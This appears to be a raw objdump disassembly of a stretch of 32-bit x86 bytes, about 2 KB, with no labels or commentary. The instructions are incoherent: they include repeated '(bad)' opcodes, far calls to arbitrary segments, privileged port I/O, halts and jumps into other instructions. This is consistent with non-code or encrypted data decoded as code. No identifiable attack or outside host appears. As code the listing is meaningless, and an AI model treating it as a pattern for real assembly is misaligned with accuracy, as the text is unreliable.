  4127f1:	xor    BYTE PTR [edx+edi*4+0x17e939eb],dl
  4127f8:	hlt    
  4127f9:	fidivr DWORD PTR [edx-0x11]
  4127fc:	mov    edi,0xcf6a1993
  412801:	fld    QWORD PTR [eax+0x55549788]
  412807:	jl     0x4127e5
  412809:	dec    edx
  41280a:	test   eax,0x5d48f849
  41280f:	jmp    0xc8b2:0x7fdb3f11
  412816:	aaa    
  412817:	not    dh
  412819:	sahf   
  41281a:	cdq    
  41281b:	and    ch,dl
  41281d:	sbb    al,0xfe
  41281f:	push   es
  412820:	(bad)  
  412822:	or     al,0xa7
  412824:	out    0x9e,eax
  412826:	call   0x843d:0x6fb9b4b7
  41282d:	xchg   ebx,eax
  41282e:	lahf   
  41282f:	jmp    0x9f21451a
  412834:	stc    
  412835:	push   cs
  412836:	jl     0x4127ff
  412838:	les    ebp,FWORD PTR [eax]
  41283a:	push   ss
  41283b:	xor    bh,bl
  41283d:	and    edx,DWORD PTR [ebp+0x3a7da97f]
  412843:	scas   al,BYTE PTR es:[edi]
  412844:	mov    ebp,0xba593296
  412849:	jbe    0x4127da
  41284b:	sbb    DWORD PTR [eax],ebx
  41284d:	dec    esp
  41284e:	popa   
  41284f:	mov    edi,0x4bebcb03
  412854:	lods   eax,DWORD PTR ds:[esi]
  412855:	pop    eax
  412856:	xlat   BYTE PTR ds:[ebx]
  412857:	rcr    DWORD PTR [ecx+0x71],1
  41285a:	inc    edi
  41285b:	push   esi
  41285c:	stc    
  41285d:	js     0x41281b
  41285f:	jl     0x4128c6
  412861:	bound  edi,QWORD PTR [esi+0x375d61e5]
  412867:	mov    ecx,0xca9df203
  41286c:	push   0xfffffff5
  41286e:	pop    edi
  41286f:	mov    ds:0x94ce39f9,eax
  412874:	or     edx,DWORD PTR [ebx-0x79]
  412877:	xor    ebx,DWORD PTR [edi+0x21]
  41287a:	push   ecx
  41287b:	ins    BYTE PTR es:[edi],dx
  41287c:	fstp   TBYTE PTR [esi-0x3157c405]
  412882:	aaa    
  412883:	or     cl,BYTE PTR [ebx+0x602c317b]
  412889:	cli    
  41288a:	push   esp
  41288b:	cmp    al,0xa0
  41288d:	call   0x6c2a:0x8934df33
  412894:	push   ss
  412895:	cmp    eax,0xe5296c99
  41289a:	rol    BYTE PTR [esi-0x1cec1d45],cl
  4128a0:	fadd   st(0),st
  4128a2:	(bad)  
  4128a3:	inc    edx
  4128a4:	inc    ebx
  4128a5:	nop
  4128a6:	push   ebp
  4128a7:	push   ss
  4128a8:	cdq    
  4128a9:	jl     0x412921
  4128ab:	push   esp
  4128ac:	aaa    
  4128ad:	jl     0x41285c
  4128af:	cmp    al,0x11
  4128b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128b2:	enter  0xf785,0xf6
  4128b6:	stos   BYTE PTR es:[di],al
  4128b8:	jns    0x412867
  4128ba:	aad    0x1
  4128bc:	jae    0x41293d
  4128be:	int    0x4f
  4128c0:	shl    BYTE PTR [ecx-0x63735c7e],0xaa
  4128c7:	aam    0x8c
  4128c9:	jnp    0x4128bd
  4128cb:	test   BYTE PTR [ebx],cl
  4128cd:	ffree  st(4)
  4128cf:	popa   
  4128d0:	mov    dh,0x7a
  4128d2:	and    eax,0x77e77af0
  4128d7:	test   DWORD PTR [ecx-0x2d],ecx
  4128da:	jns    0x4128ff
  4128dc:	pop    ds
  4128dd:	lahf   
  4128de:	push   0xffffffa8
  4128e0:	adc    al,0x11
  4128e2:	ret    
  4128e3:	mov    bl,0x6a
  4128e5:	sbb    bh,0xd8
  4128e8:	aam    0x8e
  4128ea:	lods   al,BYTE PTR ds:[esi]
  4128eb:	jg     0x41292b
  4128ed:	lods   al,BYTE PTR ds:[esi]
  4128ee:	mov    dh,0xd5
  4128f0:	cmp    BYTE PTR [esi+0x52002b7a],0xd
  4128f7:	aas    
  4128f8:	gs addr16 xchg ebp,eax
  4128fb:	mov    bh,0x77
  4128fd:	mov    bl,0xc1
  4128ff:	idiv   esp
  412901:	cmc    
  412902:	xor    BYTE PTR [ecx-0x159ab8be],cl
  412908:	dec    ebx
  412909:	mov    al,ds:0x7c5acdc4
  41290e:	xor    al,0xdf
  412910:	test   al,0x10
  412912:	adc    edx,DWORD PTR [eax-0xc8accca]
  412918:	push   ecx
  412919:	jae    0x41297d
  41291b:	dec    edi
  41291c:	lahf   
  41291d:	mov    edi,esp
  41291f:	sub    BYTE PTR [edi+0xf5c52f1],ah
  412925:	addr16 (bad) 
  412928:	pop    edx
  412929:	xchg   ebp,eax
  41292a:	mov    cl,0x33
  41292c:	cmc    
  41292d:	les    ebp,FWORD PTR [edi-0x2d8eea4d]
  412933:	push   0xffffffb1
  412935:	mov    edi,0x3fb5c038
  41293a:	in     al,dx
  41293b:	add    esp,DWORD PTR [ecx-0x50]
  41293e:	and    al,0xea
  412940:	xchg   ebx,eax
  412941:	fidiv  DWORD PTR [edi+0x37]
  412944:	xchg   DWORD PTR [esi+0x28eb21f4],edx
  41294a:	pop    ebp
  41294b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41294c:	mov    DWORD PTR [esi+0x2d04737c],eax
  412952:	data16 dec cx
  412955:	inc    esi
  412956:	xchg   ebx,eax
  412957:	pop    edi
  412958:	call   0xe767:0x7ebd2392
  41295f:	xor    al,0xe3
  412961:	dec    ecx
  412962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412963:	inc    ebp
  412964:	push   eax
  412965:	xor    al,0x74
  412967:	xor    eax,esp
  412969:	rol    DWORD PTR [esi+0x19aef3fa],cl
  41296f:	add    dh,BYTE PTR [ebp+0xae51502]
  412975:	hlt    
  412976:	inc    esp
  412977:	repnz lds eax,FWORD PTR [eax+0x136cd9b2]
  41297e:	and    dh,bl
  412980:	adc    DWORD PTR [edi],eax
  412982:	(bad)
  412986:	sti    
  412987:	jbe    0x412930
  412989:	pusha  
  41298a:	mov    eax,0xb513e903
  41298f:	cmc    
  412990:	mov    ecx,0x99e4beed
  412995:	lock sub DWORD PTR ss:[edi],ecx
  412999:	je     0x412948
  41299b:	call   0x23bf:0x76c5
  4129a1:	cmp    al,0xb4
  4129a3:	out    0xba,eax
  4129a5:	sbb    DWORD PTR [edx+0x109e8cfc],eax
  4129ab:	daa    
  4129ac:	adc    eax,0xcbfdb222
  4129b1:	in     eax,dx
  4129b2:	add    al,0xa2
  4129b4:	push   es
  4129b5:	sbb    DWORD PTR [esi+0x49c8728],eax
  4129bb:	push   ebx
  4129bc:	mov    dh,0xf0
  4129be:	lahf   
  4129bf:	xchg   edi,eax
  4129c0:	adc    eax,0xfc72a747
  4129c5:	(bad)  
  4129c6:	int3   
  4129c7:	fsubr  DWORD PTR [edi+0xcef2f86]
  4129cd:	(bad)  
  4129ce:	ss icebp 
  4129d0:	jg     0x412a38
  4129d2:	push   es
  4129d3:	ret    
  4129d4:	dec    ebp
  4129d5:	enter  0x1f23,0xf1
  4129d9:	rol    BYTE PTR [ecx+0x3d941a29],cl
  4129df:	inc    esp
  4129e0:	addr16 (bad) 
  4129e2:	in     al,0xa6
  4129e4:	sub    al,0xf0
  4129e6:	fld    DWORD PTR [edx+0x72]
  4129e9:	mov    ah,0x9f
  4129eb:	lahf   
  4129ec:	stos   BYTE PTR es:[edi],al
  4129ed:	fdiv   DWORD PTR [eax+ecx*8+0x32]
  4129f1:	nop
  4129f2:	mov    al,0xcc
  4129f4:	and    eax,0xd22a09dc
  4129f9:	jg     0x412a5c
  4129fb:	adc    al,bl
  4129fd:	scas   eax,DWORD PTR es:[edi]
  4129fe:	hlt    
  4129ff:	cli    
  412a00:	in     al,0xb
  412a02:	stos   BYTE PTR es:[edi],al
  412a03:	pop    ebx
  412a04:	sub    DWORD PTR [esi],ecx
  412a06:	pop    es
  412a07:	pop    ebp
  412a08:	and    eax,DWORD PTR [ecx]
  412a0a:	inc    ebx
  412a0b:	mov    dl,bh
  412a0d:	cmp    BYTE PTR [edx-0x143a2f0d],0xd6
  412a14:	inc    ebx
  412a15:	popa   
  412a16:	push   esi
  412a17:	mov    esp,0xfd23ed8
  412a1c:	lahf   
  412a1d:	push   ecx
  412a1e:	cmp    DWORD PTR [ecx+0x1851dec7],esi
  412a24:	mov    esi,0x37ce681e
  412a29:	shl    DWORD PTR [eax-0x5fc89c56],cl
  412a2f:	mov    WORD PTR [esi],cs
  412a31:	test   eax,0xd25bf7a8
  412a36:	fsub   st(6),st
  412a38:	push   ecx
  412a39:	rcr    DWORD PTR [edx+eiz*8+0x1],1
  412a3d:	vmwrite edx,DWORD PTR [esi-0x2f88afbb]
  412a44:	xchg   esp,eax
  412a45:	in     eax,0x5c
  412a47:	inc    ebx
  412a48:	push   ebx
  412a49:	sahf   
  412a4a:	add    ecx,esp
  412a4c:	sbb    BYTE PTR [edi+eax*8+0x2d],dh
  412a50:	call   0x41ac:0x50ee4a5f
  412a57:	das    
  412a58:	mov    dl,0x2
  412a5a:	xor    ebx,DWORD PTR [eax]
  412a5c:	add    ebx,DWORD PTR [ebp+0x2b069ce5]
  412a62:	dec    ebx
  412a63:	mov    cl,0xd8
  412a65:	call   DWORD PTR [ebx+0x3b078852]
  412a6b:	cmp    dh,BYTE PTR [edx+0x13d9c4bd]
  412a71:	(bad)  
  412a72:	stos   DWORD PTR es:[edi],eax
  412a73:	or     eax,0x3542398a
  412a78:	pop    edi
  412a79:	jno    0x412ad8
  412a7b:	loope  0x412a8c
  412a7d:	adc    al,0x57
  412a7f:	inc    edx
  412a80:	scas   eax,DWORD PTR es:[edi]
  412a81:	push   esp
  412a82:	push   eax
  412a83:	pop    ss
  412a84:	adc    al,0xa3
  412a86:	(bad)  
  412a87:	dec    ebx
  412a88:	cwde   
  412a89:	lds    esi,FWORD PTR [edi+0x1c13b486]
  412a8f:	sahf   
  412a90:	jmp    0x412ade
  412a92:	xor    al,0xd4
  412a94:	icebp  
  412a95:	or     ch,BYTE PTR ds:0xbdd6c096
  412a9b:	je     0x412a52
  412a9d:	mov    DWORD PTR [esi-0x30ce4904],edx
  412aa3:	mov    dh,0x2f
  412aa5:	xchg   BYTE PTR [esi+0x48],cl
  412aa8:	iret   
  412aa9:	stos   BYTE PTR es:[edi],al
  412aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aab:	sbb    eax,0x85355369
  412ab0:	xor    DWORD PTR [ecx],0x4
  412ab3:	int    0x14
  412ab5:	or     edx,DWORD PTR [esi]
  412ab7:	imul   ebx,DWORD PTR [edx],0x2931f8d3
  412abd:	les    esp,FWORD PTR [eax]
  412abf:	dec    ebp
  412ac0:	xor    BYTE PTR [edi+edi*4],ah
  412ac3:	cwde   
  412ac4:	stos   BYTE PTR es:[edi],al
  412ac5:	dec    eax
  412ac6:	loope  0x412b0a
  412ac8:	or     ebp,edx
  412aca:	inc    edi
  412acb:	loopne 0x412ae7
  412acd:	push   cs
  412ace:	leave  
  412acf:	shl    BYTE PTR [esi-0x3721bb60],0xbe
  412ad6:	das    
  412ad7:	mov    bh,0x2d
  412ad9:	push   ds
  412ada:	adc    BYTE PTR [edx-0x1f6f5244],al
  412ae0:	push   cs
  412ae1:	scas   eax,DWORD PTR es:[edi]
  412ae2:	push   edi
  412ae3:	(bad)
  412ae7:	mov    ebp,0x7f8522c8
  412aec:	iret   
  412aed:	push   ss
  412aee:	aad    0xd9
  412af0:	mov    dh,0x60
  412af2:	pop    ebx
  412af3:	add    edx,eax
  412af5:	jmp    0x530f:0xe6487676
  412afc:	sbb    DWORD PTR [eax-0x1ccb31a5],eax
  412b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b03:	ss jle 0x412b23
  412b06:	popf   
  412b07:	jg     0x412b37
  412b09:	or     eax,DWORD PTR [edx+esi*2-0x21]
  412b0d:	jl     0x412af4
  412b0f:	popa   
  412b10:	sar    DWORD PTR [ebx+0x5b693cd0],1
  412b16:	es xor ebp,eax
  412b19:	loop   0x412aad
  412b1b:	sub    DWORD PTR [edx+0x4c],eax
  412b1e:	ss data16 (bad) 
  412b21:	sbb    BYTE PTR [edx+0x55],cl
  412b24:	add    al,0x66
  412b26:	fs push 0x13788ed0
  412b2c:	push   ecx
  412b2d:	sub    BYTE PTR [edi+0x2b],0x9f
  412b31:	jmp    0x6887c1bd
  412b36:	mov    esi,0xcd12b58f
  412b3b:	xor    bh,bh
  412b3d:	push   esi
  412b3e:	in     eax,0x44
  412b40:	(bad)  
  412b41:	(bad)
  412b44:	lds    esi,FWORD PTR [esi-0x72199f26]
  412b4a:	lock mov esp,0xf10d8a69
  412b50:	or     BYTE PTR gs:[esi-0x4e35e595],bl
  412b57:	mov    ch,0xcf
  412b59:	rcl    esi,1
  412b5b:	retf   0x9d42
  412b5e:	jne    0x412aeb
  412b60:	stos   DWORD PTR es:[edi],eax
  412b61:	cwde   
  412b62:	out    dx,al
  412b63:	mov    DWORD PTR [edi+0x5d908e44],esi
  412b69:	mov    ah,0xa3
  412b6b:	test   eax,0xe8efe344
  412b70:	retf   0xc1b8
  412b73:	add    ebp,ebp
  412b75:	cmp    al,0x6c
  412b77:	cld    
  412b78:	rol    DWORD PTR [esi+0x4c2da0b6],cl
  412b7e:	xchg   esi,eax
  412b7f:	sahf   
  412b80:	mov    cl,0x1e
  412b82:	daa    
  412b83:	mov    esi,0xcee7070a
  412b88:	cmp    ebp,DWORD PTR [edi-0x59]
  412b8b:	and    bl,bh
  412b8d:	push   eax
  412b8e:	rcr    ecx,0x55
  412b91:	mov    bh,0xa6
  412b93:	nop
  412b94:	adc    eax,ebx
  412b96:	dec    esp
  412b97:	sbb    al,0x65
  412b99:	js     0x412b6d
  412b9b:	rol    BYTE PTR [ebx+0x4d],1
  412b9e:	sbb    eax,DWORD PTR [eax]
  412ba0:	pop    es
  412ba1:	push   edx
  412ba2:	pushf  
  412ba3:	stos   DWORD PTR es:[edi],eax
  412ba4:	sub    eax,0x31178299
  412ba9:	add    eax,0x7667e274
  412bae:	loopne 0x412bdc
  412bb0:	sub    edi,esi
  412bb2:	adc    edi,DWORD PTR [esp-0x19021f44]
  412bb9:	pop    esp
  412bba:	mov    ebp,edx
  412bbc:	test   al,0xcd
  412bbe:	adc    ebx,DWORD PTR [esi-0x16608648]
  412bc4:	lahf   
  412bc5:	or     BYTE PTR [eax+0x5c9feb68],al
  412bcb:	dec    eax
  412bcc:	shl    BYTE PTR [edi-0x3165f268],0xe6
  412bd3:	(bad)  
  412bd5:	push   0x4f
  412bd7:	les    ebp,FWORD PTR [edi-0x5fedfd4b]
  412bdd:	xor    al,0x15
  412bdf:	mov    esi,esi
  412be1:	stc    
  412be2:	xchg   esp,eax
  412be3:	int3   
  412be4:	jg     0x412b66
  412be6:	mov    dh,0xc4
  412be8:	jp     0x412b7a
  412bea:	imul   ebx,ebp,0x13
  412bed:	icebp  
  412bee:	in     eax,dx
  412bef:	(bad)  
  412bf0:	mov    al,ds:0x1546dafd
  412bf5:	jl     0x412b90
  412bf7:	pop    ecx
  412bf8:	(bad)  
  412bf9:	and    BYTE PTR ds:0x26dc7e10,ch
  412bff:	and    ebx,ebp
  412c01:	sbb    DWORD PTR [eax-0x609624b9],ebp
  412c07:	cmp    al,0xb7
  412c09:	xchg   ecx,eax
  412c0a:	sub    edx,DWORD PTR [ebp-0x73]
  412c0d:	dec    eax
  412c0e:	dec    ecx
  412c0f:	pop    ebx
  412c10:	fs mov cl,0xf3
  412c13:	jne    0x412c1c
  412c15:	(bad)  
  412c16:	dec    ecx
  412c17:	dec    edx
  412c18:	repz pushf 
  412c1a:	enter  0x470,0x73
  412c1e:	add    ch,0x8e
  412c21:	outs   dx,DWORD PTR ds:[esi]
  412c22:	into   
  412c23:	mov    esp,0x968e1af3
  412c28:	jns    0x412c80
  412c2a:	in     al,0x53
  412c2c:	repnz cwde 
  412c2e:	jl     0x412c99
  412c30:	mov    ebx,ebp
  412c32:	das    
  412c33:	fimul  WORD PTR ds:0x8afe29bf
  412c39:	jecxz  0x412c2a
  412c3b:	xchg   esi,eax
  412c3c:	aas    
  412c3d:	mov    esp,0x67a269ba
  412c42:	pop    ss
  412c43:	repz call 0x785e:0x535d42d4
  412c4b:	jmp    0xb868:0xa3355281
  412c52:	jg     0x412c3f
  412c54:	cli    
  412c55:	push   edi
  412c56:	aaa    
  412c57:	icebp  
  412c58:	mov    ch,0x3d
  412c5a:	ret    
  412c5b:	sbb    bh,BYTE PTR [esp+ebx*4]
  412c5e:	pop    ecx
  412c5f:	xchg   ebx,eax
  412c60:	push   eax
  412c61:	pop    es
  412c62:	mov    eax,ds:0xd17f0bfa
  412c67:	sub    DWORD PTR [esi-0x6e],edx
  412c6a:	xchg   BYTE PTR [ecx],dl
  412c6c:	mov    bl,0x92
  412c6e:	in     eax,0x7f
  412c70:	and    eax,0x9a7ea54
  412c75:	and    al,ch
  412c77:	aam    0x7e
  412c79:	stos   DWORD PTR es:[edi],eax
  412c7a:	sbb    bh,0x0
  412c7d:	cdq    
  412c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c7f:	int3   
  412c80:	test   eax,0xedb66080
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	mov    eax,0x27f4782f
  412c8b:	jo     0x412c40
  412c8d:	push   edx
  412c8e:	xor    dh,BYTE PTR [ebp+0x34]
  412c91:	adc    ah,BYTE PTR ds:0x1db89b7c
  412c97:	inc    esp
  412c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c99:	mov    eax,ds:0x17489be8
  412c9e:	stos   DWORD PTR es:[edi],eax
  412c9f:	test   BYTE PTR [ebp+0x1a5eee6d],dl
  412ca5:	test   eax,0x88cca85a
  412caa:	mov    bh,0xb7
  412cac:	adc    bh,ch
  412cae:	push   edi
  412caf:	daa    
  412cb0:	and    ch,dl
  412cb2:	or     eax,0x4699b79e
  412cb7:	into   
  412cb8:	loope  0x412c40
  412cba:	je     0x412ca9
  412cbc:	mov    esp,0xe6ca97cb
  412cc1:	in     eax,0x31
  412cc3:	test   eax,0x8b0121cd
  412cc8:	cwde   
  412cc9:	dec    esp
  412cca:	push   0xfffffff2
  412ccc:	sahf   
  412ccd:	aad    0x27
  412ccf:	lods   eax,DWORD PTR ds:[esi]
  412cd0:	sbb    BYTE PTR [eax-0x73],bh
  412cd3:	push   esp
  412cd4:	les    ebx,FWORD PTR [esi-0x2a55911e]
  412cda:	test   esi,0xb634d040
  412ce0:	enter  0xcfbb,0xf
  412ce4:	mov    ebx,0x5a5843a1
  412ce9:	push   es
  412cea:	pop    si
  412cec:	jl     0x412d5d
  412cee:	cmp    esp,DWORD PTR [ebx+0x8]
  412cf1:	nop
  412cf2:	sub    eax,0xa1caeed0
  412cf7:	int3   
  412cf8:	sub    ebx,ebx
  412cfa:	inc    esp
  412cfb:	push   0xffffffc4
  412cfd:	mov    ecx,0xab7729a4
  412d02:	pushf  
  412d03:	mov    al,ds:0x73cdb14a
  412d08:	ja     0x412cd8
  412d0a:	int    0xfc
  412d0c:	(bad)  
  412d0d:	sahf   
  412d0e:	fistp  QWORD PTR [esi+0x55ab14f1]
  412d14:	mov    BYTE PTR [edi-0x34],ch
  412d17:	xchg   ebp,eax
  412d18:	and    bh,dl
  412d1a:	cmp    eax,0x166b6c03
  412d1f:	mov    ecx,0x60e0bb9
  412d24:	ret    0x1563
  412d27:	ret    
  412d28:	stos   DWORD PTR es:[edi],eax
  412d29:	ss push es
  412d2b:	inc    esi
  412d2c:	and    DWORD PTR [ecx-0x1af0d6a2],esp
  412d32:	popf   
  412d33:	pop    edi
  412d34:	ja     0x412d22
  412d36:	xchg   BYTE PTR [eax-0x789d8da8],cl
  412d3c:	mov    ah,0xb7
  412d3e:	pop    es
  412d3f:	je     0x412d6e
  412d41:	mov    ecx,0xffe2c85d
  412d46:	mov    eax,ds:0x124c08ad
  412d4b:	mov    cl,0x6b
  412d4d:	ins    DWORD PTR es:[edi],dx
  412d4e:	rcl    ch,0xe3
  412d51:	loopne 0x412d0c
  412d53:	cli    
  412d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d55:	iret   
  412d56:	(bad)  
  412d57:	jmp    0xe0af:0x6e98022
  412d5e:	dec    eax
  412d5f:	pop    ecx
  412d60:	repnz ins DWORD PTR es:[edi],dx
  412d62:	push   ebp
  412d63:	sub    eax,0xd2504626
  412d68:	outs   dx,BYTE PTR ds:[esi]
  412d69:	rol    BYTE PTR [ebx-0x3],cl
  412d6c:	jmp    0x412da2
  412d6e:	mov    ds:0xe927c845,eax
  412d73:	cld    
  412d74:	xor    eax,edx
  412d76:	pusha  
  412d77:	sbb    eax,0x784c0f7e
  412d7c:	push   0xc1349af5
  412d81:	cmp    ah,0x58
  412d84:	fidivr DWORD PTR [esi+0x70873890]
  412d8a:	pop    edi
  412d8b:	push   ebx
  412d8c:	mov    al,ds:0x76fdeff3
  412d91:	adc    edx,DWORD PTR [edi]
  412d93:	add    DWORD PTR [esi+eiz*8],ecx
  412d96:	gs xchg esi,eax
  412d98:	shl    BYTE PTR [ebx+0x6a],0x17
  412d9c:	xor    al,0x4
  412d9e:	fwait
  412d9f:	je     0x412dd4
  412da1:	nop
  412da2:	adc    ebp,ebx
  412da4:	mov    edi,0x284398ed
  412da9:	addr16 jo 0x412daf
  412dac:	mov    esp,0xf10e234d
  412db1:	xlat   BYTE PTR ds:[ebx]
  412db3:	xor    ch,BYTE PTR [ecx-0x6b]
  412db6:	or     eax,0x412e2492
  412dbb:	mov    ds:0x1e05ebbf,al
  412dc0:	sub    bh,ah
  412dc2:	jbe    0x412e1c
  412dc4:	or     DWORD PTR [ecx+ebp*4+0xd],eax
  412dc8:	add    al,0xbb
  412dca:	and    eax,0x71d1a2d4
  412dcf:	cmp    BYTE PTR [esp+ebp*8+0x1a539dd7],ah
  412dd6:	in     al,0x42
  412dd8:	mov    al,0x3e
  412dda:	cmp    BYTE PTR [edi-0x5b],al
  412ddd:	mov    ch,0xee
  412ddf:	(bad)  
  412de0:	add    esp,DWORD PTR [edx]
  412de2:	push   eax
  412de3:	loopne 0x412df1
  412de5:	inc    edx
  412de6:	add    ah,BYTE PTR [esp+edi*2-0x5e8bc4c8]
  412ded:	int3   
  412dee:	lock ins DWORD PTR es:[edi],dx
  412df0:	mov    ebx,0x73d29a1c
  412df5:	fs (bad) 
  412df7:	dec    ebp
  412df8:	and    eax,0xa25c3dab
  412dfd:	adc    eax,0xa11ab3c4
  412e02:	mov    ds:0xd798a94b,eax
  412e07:	inc    ebp
  412e08:	adc    BYTE PTR es:[ecx],cl
  412e0b:	popa   
  412e0c:	xlat   BYTE PTR ds:[ebx]
  412e0d:	fisttp QWORD PTR [ecx-0xbfd9faa]
  412e13:	ret    
  412e14:	rcr    BYTE PTR [edi],cl
  412e16:	(bad)  
  412e17:	sub    eax,0x6dad7e3c
  412e1c:	lock enter 0x23b0,0x54
  412e21:	aas    
  412e22:	movaps XMMWORD PTR [edx+0x7238df66],xmm0
  412e29:	mov    cl,0x4c
  412e2b:	and    BYTE PTR [ebp+0x41],ah
  412e2e:	dec    ebx
  412e2f:	call   0x14024183
  412e34:	aas    
  412e35:	rol    DWORD PTR [ebx],1
  412e37:	jne    0x412e97
  412e39:	cmp    esp,DWORD PTR [edx]
  412e3b:	pop    ebp
  412e3c:	call   0xb79c2d3c
  412e41:	pop    esp
  412e42:	adc    eax,0x382177b6
  412e47:	in     al,dx
  412e48:	inc    eax
  412e49:	ins    DWORD PTR es:[edi],dx
  412e4a:	les    eax,FWORD PTR [eax+0x1c]
  412e4d:	lds    esi,FWORD PTR [esi+0x7ddcf075]
  412e53:	sub    eax,0x43504723
  412e58:	loope  0x412e5d
  412e5a:	out    dx,eax
  412e5b:	jb     0x412ea7
  412e5d:	xor    BYTE PTR [esi+0xf4fffe],0x0
  412e64:	inc    esp
  412e65:	pop    ecx
  412e66:	outs   dx,BYTE PTR ds:[esi]
  412e67:	frstor [ebp+0x2]
  412e6a:	lods   eax,DWORD PTR ds:[esi]
  412e6b:	xchg   edx,eax
  412e6c:	jo     0x412e49
  412e6e:	stos   BYTE PTR es:[edi],al
  412e6f:	jo     0x412ed1
  412e71:	stos   BYTE PTR es:[edi],al
  412e72:	sub    DWORD PTR [ecx],esi
  412e74:	jp     0x412e5e
  412e76:	jg     0x412e16
  412e78:	data16 add cl,BYTE PTR [ebp+eax*2+0x61]
  412e7d:	popa   
  412e7e:	push   cs
  412e7f:	fwait
  412e80:	test   al,0xf8
  412e82:	in     eax,dx
  412e83:	ret    
  412e84:	sub    eax,DWORD PTR [esi]
  412e86:	(bad)  
  412e87:	(bad)  
  412e88:	inc    DWORD PTR [eax-0x460e2b85]
  412e8e:	xlat   BYTE PTR ds:[ebx]
  412e8f:	cwde   
  412e90:	jns    0x412e26
  412e92:	and    ch,BYTE PTR [edx+0x30]
  412e95:	loopne 0x412e35
  412e97:	push   edi
  412e98:	scas   al,BYTE PTR es:[edi]
  412e99:	jl     0x412e5f
  412e9b:	aam    0x4c
  412e9d:	rcl    BYTE PTR [eax+0xe59a16f],cl
  412ea3:	push   ebx
  412ea4:	mov    eax,0xacfb7073
  412ea9:	add    BYTE PTR [ebx],al
  412eab:	pusha  
  412eac:	mov    eax,0x343f8710
  412eb1:	loop   0x412e9b
  412eb3:	jo     0x412e9b
  412eb5:	xor    al,0xbd
  412eb7:	mov    ds:0x8163c64d,eax
  412ebc:	ins    BYTE PTR es:[edi],dx
  412ebd:	inc    ebx
  412ebe:	push   es
  412ebf:	lds    ecx,FWORD PTR [ebx+0x33]
  412ec2:	repnz into 
  412ec4:	lock ds mov dl,0x2f
  412ec8:	cmp    eax,0x5a104c
  412ecd:	mov    dh,al
  412ecf:	and    ecx,edx
  412ed1:	or     al,0x6e
  412ed3:	call   0xcee85351
  412ed8:	loope  0x412ec0
  412eda:	or     al,0x44
  412edc:	scas   eax,DWORD PTR es:[edi]
  412edd:	inc    ecx
  412ede:	inc    edi
  412edf:	les    eax,FWORD PTR [edx-0x79c1338d]
  412ee5:	mov    edx,0xdc3a64f4
  412eea:	mov    dh,0x94
  412eec:	arpl   WORD PTR [edi+0x30d67095],ax
  412ef2:	in     eax,dx
  412ef3:	scas   al,BYTE PTR es:[edi]
  412ef4:	xor    DWORD PTR [eax],eax
  412ef6:	sbb    dl,dh
  412ef8:	(bad)  
  412ef9:	aam    0x9b
  412efb:	jne    0x412eab
  412efd:	in     eax,dx
  412efe:	xchg   esi,eax
  412eff:	sub    edx,edx
  412f01:	hlt    
  412f02:	add    eax,DWORD PTR [edi+0x50]
  412f05:	test   DWORD PTR [ebp+esi*4-0x39cf677],ebx
  412f0c:	imul   edi,esp,0xb021c8ad
  412f12:	cld    
  412f13:	add    DWORD PTR [bx+si-0xb40],ecx
  412f18:	sbb    eax,0xd7cecef2
  412f1d:	es iret 
  412f1f:	cmc    
  412f20:	adc    eax,0x7b98d32
  412f25:	xor    eax,0xeafd1892
  412f2a:	sub    al,0xe3
  412f2c:	out    dx,al
  412f2d:	dec    esp
  412f2e:	fdiv   QWORD PTR [edx+eiz*2-0x23]
  412f32:	mov    ds:0x139ef286,eax
  412f37:	sub    ecx,eax
  412f39:	xor    edx,DWORD PTR [edi-0x4]
  412f3c:	xor    BYTE PTR [ecx+0x2f],0xc9
  412f40:	call   0xd4cf6f77
  412f45:	stos   DWORD PTR es:[edi],eax
  412f46:	sbb    ax,WORD PTR [edi+0x606eee03]
  412f4d:	sub    al,0x70
  412f4f:	cmp    al,0x3d
  412f51:	xor    ebp,DWORD PTR [ebp-0x482058fc]
  412f57:	or     dh,ch
  412f59:	or     al,0x68
  412f5b:	mul    BYTE PTR [ebx+0x106a41e9]
  412f61:	or     dh,BYTE PTR [edi-0x6e552723]
  412f67:	sub    dh,al
  412f69:	test   DWORD PTR [ebx+0x56],eax
  412f6c:	cmp    dl,cl
  412f6e:	(bad)  
  412f6f:	or     ebx,edi
  412f71:	pop    esi
  412f72:	jo     0x412f8d
  412f74:	add    al,0x2a
  412f76:	cmp    ebp,DWORD PTR [esi+0x5545c0fa]
  412f7c:	arpl   WORD PTR [ecx-0x504037be],cx
  412f82:	sub    BYTE PTR [eax+0x42cb6f1b],dh
  412f88:	mov    BYTE PTR [esi+0x23],0x63
  412f8c:	pop    ebp
  412f8d:	mov    dh,0x90
  412f8f:	mov    DWORD PTR [edx],esp
  412f91:	(bad)  
  412f92:	mov    al,0xd7
  412f94:	pop    es
  412f95:	dec    ecx
  412f96:	adc    edi,esi
  412f98:	scas   al,BYTE PTR es:[edi]
  412f99:	and    BYTE PTR [esi+0x5e],0x7c
  412f9d:	sub    al,0xf6
  412f9f:	jae    0x412fb6
  412fa1:	add    dh,dl
  412fa3:	into   
  412fa4:	fild   DWORD PTR [esi]
  412fa6:	lea    ebx,ds:0xf3b491c3
  412fac:	inc    esi
  412fad:	out    dx,al
  412fae:	pop    ecx
  412faf:	mov    WORD PTR [eax+0x792640b9],fs
  412fb5:	in     eax,0xca
  412fb7:	xchg   BYTE PTR [esi-0x1],ah
  412fba:	mov    ebx,0xda7239e3
  412fbf:	std    
  412fc0:	jp     0x412f81
  412fc2:	mov    edi,0x8c2ce1c8
  412fc7:	arpl   dx,cx
  412fc9:	add    BYTE PTR [edx],bh
  412fcb:	or     al,0x6d
  412fcd:	std    
  412fce:	retf   0x19f
  412fd1:	call   0xc1b2be4e
  412fd6:	inc    eax
  412fd7:	sbb    BYTE PTR ds:0xe879e164,ch
  412fdd:	mov    esi,0x64c6f6e7
  412fe2:	or     dl,BYTE PTR [ebx]
  412fe4:	pusha  
  412fe5:	push   es
  412fe6:	add    edx,edx
  412fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe9:	pop    ebp
